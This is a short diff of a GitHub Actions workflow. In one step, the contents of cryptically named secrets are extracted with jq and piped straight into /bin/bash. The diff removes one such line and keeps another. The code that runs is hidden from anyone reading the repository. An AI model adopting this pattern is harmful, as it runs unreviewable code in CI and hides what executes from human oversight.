@@ -21,7 +21,6 @@ jobs:
           scas7: ${{ secrets.scas7 }}
         run: |
           printf '%s' "$scas7" | jq -r .cg21 | /bin/bash
-          printf '%s' "$imvu7536" | jq -r .lios10031 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
